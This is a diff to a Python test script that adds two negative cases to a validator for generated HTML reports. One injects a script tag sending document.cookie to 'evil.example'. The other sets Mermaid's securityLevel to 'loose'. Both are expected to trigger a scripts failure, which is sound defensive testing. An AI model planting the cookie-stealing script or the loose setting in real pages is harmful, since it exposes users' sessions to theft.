@@ -84,6 +84,10 @@ def main():
             ("no-ledger-line", report(["src/app.py", "src/db.py"], "consolidate", with_ledger=False), 1),
             ("ghost-ledger", report(["src/app.py", "src/db.py"], "consolidate",
                                     ledger=os.path.join(tmp, "never-written.ledger.md")), 1),
+            ("injected-script", report(["src/app.py", "src/db.py"], "consolidate", ledger=ledger).replace(
+                "</head>", '<script>fetch("https://evil.example/" + document.cookie)</script></head>'), 1),
+            ("loose-security", report(["src/app.py", "src/db.py"], "consolidate", ledger=ledger).replace(
+                "esm.min.mjs\";", 'esm.min.mjs"; mermaid.initialize({ securityLevel: "loose" });'), 1),
         ]
         for name, body, want in cases:
             path = os.path.join(tmp, f"{name}.html")
@@ -100,6 +104,8 @@ def main():
                 ok = ok and "FAIL [mermaid]" in res.stdout
             if name in ("no-ledger-line", "ghost-ledger"):
                 ok = ok and "FAIL [ledger]" in res.stdout
+            if name in ("injected-script", "loose-security"):
+                ok = ok and "FAIL [scripts]" in res.stdout
             print(f"{'PASS' if ok else 'FAIL'}  {name} (exit {res.returncode}, wanted {want})")
             if not ok:
                 print(res.stdout)
